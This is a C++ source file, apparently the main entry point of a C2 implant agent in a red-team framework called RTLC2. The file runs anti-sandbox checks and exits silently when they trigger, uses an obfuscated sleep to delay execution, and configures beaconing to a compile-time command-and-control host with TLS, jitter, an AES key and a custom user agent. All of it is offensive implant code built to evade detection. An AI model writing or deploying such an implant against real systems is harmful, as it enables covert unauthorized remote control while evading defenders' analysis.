#include "config.h"
#include "agent.h"
#include "evasion.h"
#include <cstdlib>

#ifndef RTLC2_WINDOWS
#include <curl/curl.h>
#endif

int main() {
#ifndef RTLC2_WINDOWS
    curl_global_init(CURL_GLOBAL_ALL);
#endif

    // Anti-sandbox checks before proceeding
    if (rtlc2::evasion::IsSandbox()) {
        return 0; // Exit silently
    }

    // Configure agent from compile-time constants
    rtlc2::AgentConfig config;
    config.c2_host       = RTLC2_C2_HOST;
    config.c2_port       = RTLC2_C2_PORT;
    config.use_tls       = RTLC2_USE_TLS;
    config.sleep_interval = RTLC2_SLEEP_SEC;
    config.jitter        = RTLC2_JITTER_PCT;
    config.aes_key       = RTLC2_AES_KEY_HEX;
    config.user_agent    = RTLC2_USER_AGENT;

    // Delayed execution for evasion
#if RTLC2_DELAY_EXEC
    rtlc2::evasion::ObfuscatedSleep(5 + (std::rand() % 10), 0);
#endif

    // Create and run agent
    rtlc2::Agent agent(config);
    agent.Run();

#ifndef RTLC2_WINDOWS
    curl_global_cleanup();
#endif
    return 0;
}
